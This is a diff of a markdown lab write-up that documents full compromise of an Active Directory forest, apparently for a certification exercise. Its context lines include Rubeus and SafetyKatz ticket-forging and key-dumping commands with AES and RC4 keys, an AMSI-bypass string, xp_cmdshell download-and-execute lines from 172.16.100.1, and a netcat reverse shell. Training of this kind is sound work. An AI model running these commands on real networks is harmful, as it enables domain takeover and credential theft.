@@ -26,37 +26,32 @@ By the conclusion of this report, the reader should understand both the **tactic
 
 ## Executive Summary
 
-Below is a concise narrative of how the Active Directory environment was discovered, exploited, and ultimately fully compromised. This summary omits lower-impact details and focuses on the key steps that drove the attack forward.
+This is a concise narrative of how the Active Directory environment was discovered, exploited, and ultimately fully compromised. This summary omits lower-impact details and focuses on the key steps that drove the attack forward.
 
-1. **Initial Recon and Limited Privileges**
+- **Initial Recon and Limited Privileges**
     - Began by enumerating the `tech.finance.corp` child domain and forest relationship, revealing a two-domain (child/parent) structure with a bidirectional trust to `finance.corp`.
     - Identified relevant domain accounts, including `tech\sqlserversync` (with replication rights and SQL admin privileges on `dbserver31.tech.finance.corp`) and `tech\techservice` (actively logged on `mgmtsrv.tech.finance.corp`).
     - Found no immediately exploitable SMB shares or local administrative privileges (as `tech\studentuser`) in the environment.
-2. **Local Privilege Escalation on `studvm.tech.finance.corp`**
+- **Local Privilege Escalation on `studvm.tech.finance.corp`**
     - A misconfigured Windows service (`vds`) allowed modifying its binary path. By pointing it to `net localgroup Administrators tech\studentuser /add`, the attacker elevated to local admin on `studvm.tech.finance.corp`.
-3. **Constrained Delegation → Foothold on `mgmtsrv.tech.finance.corp`**
+- **Constrained Delegation → Foothold on `mgmtsrv.tech.finance.corp`**
     - Enumeration revealed Constrained Delegation for the computer account `tech\STUDVM$`, delegating to CIFS on `mgmtsrv.tech.finance.corp`.
     - Forged an S4U ticket with `tech\STUDVM$`'s AES key, impersonating `Administrator`, and achieved remote administrative access on `mgmtsrv.tech.finance.corp`.
-4. **Further Credential Extraction and Persistence**
-    
-    - On **`mgmtsrv`**, extracted the **`tech\techservice`** credentials and the machine's Kerberos keys.
-    - Leveraged the **RC4 key** of `mgmtsrv` to craft a **Silver Ticket**, granting **persistent administrative** access to the server without contacting the Domain Controller.
-5. **Pivot to `techsrv30.tech.finance.corp`**
-    
-    - With **`tech\techservice`**'s AES key, performed an **OverPass-The-Hash** to obtain a TGT and connect to **`techsrv30`**.
-    - Extracted **`tech\databaseagent`** credentials and discovered it was a **sysadmin** on the SQL instance at **`dbserver31`**.
-6. **SQL `xp_cmdshell` → Lateral Movement onto `dbserver31`**
-    
-    - Abused the **SQL sysadmin** rights (`tech\databaseagent`) to run `xp_cmdshell` on **`dbserver31`**, spawning a **reverse shell** as **`tech\sqlserversync`**.
-    - Elevated to **SYSTEM** on `dbserver31` via **GodPotato** token impersonation and then extracted the **domain replication** credentials of `sqlserversync`.
-7. **DCSync and Domain Admin**
-    
-    - With `tech\sqlserversync`'s replication privileges, performed a **DCSync** attack to retrieve the **`tech\administrator`** and **`tech\krbtgt`** hashes and AES keys.
-    - Forged a **Golden Ticket** (using the `krbtgt` key) to gain **Domain Admin** privileges in **`tech.finance.corp`**.
-8. **Cross-Trust Attack to `finance.corp`**
-    
-    - Finally, abused the **child-domain `krbtgt`** encryption key to inject an **Enterprise Admin** SID and impersonate an EA across the **forest trust**.
-    - Obtained full administrative access on **`finance-dc.finance.corp`**, extracting more credentials and completing the **root domain** compromise.
+- **Further Credential Extraction and Persistence**
+    - On `mgmtsrv.tech.finance.corp`, extracted the `tech\techservice` credentials and the machine `tech\MGMTSRV$`'s Kerberos keys.
+    - Leveraged the Kerberos key of `tech\MGMTSRV$` to craft a Silver Ticket, granting persistent administrative access to the server without contacting the Domain Controller.
+- **Pivot to `techsrv30.tech.finance.corp`**
+    - With `tech\techservice`'s Kerberos key, performed an OverPass-The-Hash to obtain a TGT and connect to `techsrv30.tech.finance.corp`.
+    - Extracted `tech\databaseagent` credentials and discovered it was a `sysadmin` on the SQL instance at `dbserver31.tech.finance.corp`.
+- **SQL `xp_cmdshell` → Lateral Movement onto `dbserver31.tech.finance.corp`**
+    - Abused the SQL `sysadmin` rights (`tech\databaseagent`) to run `xp_cmdshell` on `dbserver31.tech.finance.corp`, spawning a reverse shell as `tech\sqlserversync`.
+    - Elevated to `SYSTEM` on `dbserver31.tech.finance.corp` via `GodPotato` token impersonation and then extracted the domain replication credentials of `tech\sqlserversync`.
+- **DCSync and Domain Admin**
+    - With `tech\sqlserversync`'s replication privileges, performed a DCSync attack to retrieve the `tech\administrator` and `tech\krbtgt` hashes and AES keys.
+    - Forged a Golden Ticket (using the `tech\krbtgt` key) to gain Domain Admin privileges in `tech.finance.corp`.
+- **Cross-Trust Attack to `finance.corp`**
+    - Finally, abused the child-domain `tech\krbtgt` encryption key to inject an Enterprise Admin SID and impersonate an EA across the forest trust.
+    - Obtained full administrative access on `finance-dc.finance.corp`, extracting more credentials and completing the root domain compromise.
 
 By the end of these steps, the entire forest was under attacker control. Key techniques included service misconfiguration abuse, Constrained Delegation forging, OverPass-The-Hash, SQL `xp_cmdshell` exploitation, token impersonation for local escalation, LSASS memory dumps and DCSync for domain credentials, and Golden Ticket/SID History forging to extend compromise into the root domain.
 
@@ -72,7 +67,7 @@ Description: Performed a comprehensive enumeration of the `tech.finance.corp` do
 
 - 1.1) **Identify Domains, Forests, Trusts**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -159,7 +154,7 @@ WhenChanged     : 3/11/2025 8:53:24 AM
 
 - 1.2) **Identify Domain Users, Computers, Groups**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `whoami`:
 ```
@@ -239,7 +234,7 @@ MemberSID               : S-1-5-21-1712611810-3596029332-2671080496-500
 
 - 1.3) **Identify Domain ACLs, OUs, GPOs**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'sqlserversync'}`:
 ```
@@ -305,7 +300,7 @@ IdentityReferenceClass  : user
 
 - 1.4) **Attempt to Discovery Domain Shares**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `Import-Module C:\AD\Tools\PowerHuntShares.psm1`
 
@@ -335,7 +330,7 @@ IdentityReferenceClass  : user
 
 - 1.5) **Identify Local Admin Access**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
 
@@ -346,7 +341,7 @@ IdentityReferenceClass  : user
 
 - 1.6) **Identify Domain Active Sessions**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`
 
@@ -368,7 +363,7 @@ mgmtsrv🖥️    TECH\techservice👤    False
 
 Description: Discovered a misconfigured Windows service (`vds`) that was running as `LocalSystem` and allowed modifications to its binary path. By leveraging `PowerUp`, the service's path was temporarily replaced with a command to add `tech\studentuser` to the local Administrators group. This successfully elevated the user's privileges on `studvm.tech.finance.corp`.
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -420,7 +415,7 @@ ServiceAbused Command
 vds           net localgroup Administrators tech\studentuser /add⏫
 ```
 
-![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
 `whoami /groups`:
 ```
@@ -444,7 +439,7 @@ BUILTIN\Administrators👥                   Alias            S-1-5-32-544 Manda
 
 Description: Enumerated service accounts with Service Principal Names (SPNs) and performed a Kerberoasting attack on `tech\sqlserversync` in an attempt to gain the service account password and pivot onto `dbserver31.tech.finance.corp`. Although the Kerberos TGS was successfully extracted, the password could not be cracked with multiple wordlists, implying a strong password policy.
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -516,7 +511,7 @@ $z="t";$y="s";$x="a";$w="o";$v="r";$u="e";$t="b";$s="r";$r="e";$q="k";$Pwn="$q$r
 [*] Roasted hashes written to : C:\AD\Tools\krb5tgs_hashes.txt📌
 ```
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `type C:\AD\Tools\krb5tgs_hashes.txt`:
 ```
@@ -558,7 +553,7 @@ Description: Performed Active Directory enumeration to identify users or machine
 
 - **Attempt to Find a Delegator User where Constrained Delegation is Enabled**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -574,7 +569,7 @@ Description: Performed Active Directory enumeration to identify users or machine
 
 - **Identify a Delegator Server where Constrained Delegation is Enabled**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -628,7 +623,7 @@ dnshostname                   : studvm.tech.finance.corp
 
 - **Extract the Delegator Server AES Kerberos Key**
 
-![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
 ```
@@ -658,7 +653,7 @@ SID               : S-1-5-18
 
 - **Forge an S4U TGS using the Delegator Server AES Kerberos Key for the CIFS Service Delegation and Leverage it to Request and Obtain a TGS for the HTTP Service**
 
-![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:studvm$ /aes256:7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6 /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.tech.finance.corp /altservice:http /ptt`:
 ```
@@ -854,7 +849,7 @@ SID               : S-1-5-18
 
 Description: Leveraged the RC4 Kerberos key extracted from `mgmtsrv.tech.finance.corp` to forge a Silver Ticket for the `http/mgmtsrv.tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting administrator-level access to `mgmtsrv.tech.finance.corp` without requiring authentication from the Domain Controller. This technique enables persistence and stealthy access to the target machine, bypassing standard Kerberos authentication mechanisms.
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/mgmtsrv.tech.finance.corp /rc4:207218a0920d00bbbd4daa22f6e767d3 /sid:S-1-5-21-1325336202-3661212667-302732393 /ldap /user:administrator /domain:tech.finance.corp /ptt`:
 ```
@@ -929,7 +924,7 @@ C:\Users\Administrator.TECH>
 
 Description: Used the AES-256 Kerberos Key of `tech\techservice`, extracted in a previous step, to request a TGT (Ticket Granting Ticket) without needing the user's password. This was achieved using `Rubeus` to perform an OverPass-The-Hash attack. The obtained ticket was injected into a new logon session, allowing authenticated access as `tech\techservice` and enabling lateral movement to `techsrv30.tech.finance.corp`.
 
-![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:techservice /aes256:7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -1118,7 +1113,7 @@ SID               : S-1-5-18
 
 Description: Used the cleartext credential of `tech\databaseagent`, extracted in a previous step, to initiate a net-only authentication session with `RunAs`. This allowed running commands as `tech\databaseagent` while maintaining the original user's context in the local environment. Privilege enumeration revealed that `SeDebugPrivilege` and `SeImpersonatePrivilege` were enabled, which could be leveraged for potential privilege escalation and further lateral movement within the domain.
 
-![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
 `runas /user:tech\databaseagent /netonly "powershell -Command \"Start-Process cmd -Verb RunAs\""`:
 ```
@@ -1128,7 +1123,7 @@ Attempting to start powershell -Command "Start-Process cmd -Verb RunAs" as user 
 
 ![New spawned terminal process 2](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_2.png)
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `whoami`:
 ```
@@ -1178,7 +1173,7 @@ Description: Exploited a `sysadmin`-level SQL Server instance on `dbserver31.tec
 
 - **Identify a Target SQL Server where we have Authentication Rights**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
 ```
@@ -1281,7 +1276,7 @@ Links       :
 
 - **Obtain a Reverse Shell Executing a PowerShell Script on the Target SQL Server**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `C:\AD\Tools\nc64.exe -lvp 443`:
 ```
@@ -1294,7 +1289,7 @@ listening on [any] 443 ...
 
 `Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget 'dbserver31'`
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 ```
 [...]
@@ -1388,7 +1383,7 @@ Description: Used `GodPotato`, an exploit leveraging Named Pipe token impersonat
 
 `iwr http://172.16.100.1/nc64.exe -OutFile C:\Users\Public\nc64.exe`
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `C:\AD\Tools\nc64.exe -lvp 1337`:
 ```
@@ -1401,7 +1396,7 @@ listening on [any] 1337 ...
 
 `C:\Users\Public\GodPotato-NET4.exe -cmd "C:\Users\Public\nc64.exe -e C:\Windows\System32\cmd.exe 172.16.100.1 1337"`
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 ```
 [...]
@@ -1515,7 +1510,7 @@ SID               : S-1-5-18
 
 Description: An OverPass-The-Hash approach was used to impersonate `tech\sqlserversync` by requesting a TGT with the account's AES-256 Kerberos key. Since `sqlserversync` possessed domain replication privileges, we then executed a DCSync attack on `tech\administrator` and `tech\krbtgt` to extract their AES-256 Kerberos keys and NTLM hashes. The successful retrieval of these credentials enables lateral movement and privilege escalation. Notably, the `tech\krbtgt` credentials are useful for Golden Ticket attacks, while the `tech\administrator` credentials provide administrative access to the domain, facilitating further exploitation.
 
-![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:sqlserversync /aes256:9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -1715,7 +1710,7 @@ Supplemental Credentials:
 
 Description: Leveraged the AES-256 Kerberos key extracted for `tech\administrator` to forge a Golden Ticket for the `krbtgt/tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting administrator-level access to the domain. This technique allows domain persistence, as the forged ticket can continue to provide access to the domain services, bypassing the standard authentication mechanism.
 
-![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /aes256:d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -1762,7 +1757,7 @@ Description: Leveraged the AES-256 Kerberos key extracted for `tech\administrato
 
 ![New spawned terminal process](./assets/screenshots/learning_objective_08_new_spawned_terminal_process.png)
 
-![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
 `whoami /groups`:
 ```
@@ -1937,7 +1932,7 @@ Description: Abused the child domain `krbtgt` TGT encryption key from `tech.fina
 
 - **Forge a Golden Ticket (with EA SID History) using the Child DC's `krbtgt` TGT Encryption Key**
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
